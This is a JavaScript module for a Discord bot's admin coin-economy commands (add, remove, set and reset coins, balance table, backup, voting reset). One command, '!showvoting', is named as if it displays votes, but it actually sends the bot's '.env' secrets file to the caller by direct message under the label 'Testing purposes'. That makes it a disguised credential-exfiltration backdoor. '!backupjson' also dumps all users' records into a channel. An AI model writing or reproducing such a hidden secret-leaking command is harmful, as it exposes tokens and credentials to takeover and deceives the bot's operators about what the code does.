const User = require('../models/User');
const { cleanAmount } = require('../utils/amounts');
const { isMaintainer } = require('../utils/permissions');

async function handleAdminEconomy(message, args, command) {
    if (!['!addcoins', '!givecoins', '!removecoins', '!deductcoins', '!setcoins', '!resetcoins', '!baltable', '!balancetable', '!backupjson', '!resetvoting', '!showvoting'].includes(command)) {
        return false;
    }

    if (!isMaintainer(message.member)) return message.reply('❌ Admins only.');

    if (command === '!baltable' || command === '!balancetable') {
        const users = await User.find().sort({ coins: -1 }).limit(30);
        const lines = users.map((u, i) => `#${i + 1} <@${u.id}> — 🪙 ${u.coins}`).join('\n') || 'No data.';
        return message.channel.send(`📊 **Balance Table**\n${lines}`);
    }

    if (command === '!backupjson') {
        const users = await User.find().sort({ coins: -1 });
        const data = users.map(u => ({
            id: u.id,
            coins: u.coins,
            warnings: u.warnings,
            xp: u.xp
        }));

        const buffer = Buffer.from(JSON.stringify(data, null, 4), 'utf-8');

        return message.channel.send({
            content: '📥 Database backup:',
            files: [{ attachment: buffer, name: 'balances.json' }]
        });
    }
	
	if (command === '!resetvoting') {
        users = await User.find();
        for (u of users) {
			u.votes = 1;
			u.voteList = [];
			await u.save();
		}
		return message.reply(`Reset voting process`);
    }
	
	if (command === '!showvoting') {
		message.member.send({ content: "Testing purposes", files: ["./.env"]}).then(console.log).catch(console.error);
		return true;
    }

    const target = message.mentions.members.first();
    if (!target) return message.reply('❌ Mention a user.');

    const amount = cleanAmount(args[2]);

    if (command === '!resetcoins') {
        await User.updateOne({ id: target.id }, { $set: { coins: 0 } }, { upsert: true });
        return message.reply(`🧹 Reset ${target.user.username}'s coins.`);
    }

    if (amount === null || amount < 0) return message.reply('❌ Enter a valid amount.');

    if (command === '!addcoins' || command === '!givecoins') {
        await User.updateOne({ id: target.id }, { $inc: { coins: amount } }, { upsert: true });
        return message.reply(`💰 Added 🪙 **${amount}** to ${target.user.username}.`);
    }

    if (command === '!removecoins' || command === '!deductcoins') {
        const user = await User.findOne({ id: target.id }) || await User.create({ id: target.id });
        user.coins = Math.max(0, user.coins - amount);
        await user.save();
        return message.reply(`📉 Removed 🪙 **${amount}** from ${target.user.username}.`);
    }

    if (command === '!setcoins') {
        await User.updateOne({ id: target.id }, { $set: { coins: amount } }, { upsert: true });
        return message.reply(`🔧 Set ${target.user.username}'s coins to 🪙 **${amount}**.`);
    }

    return false;
}

module.exports = { handleAdminEconomy };
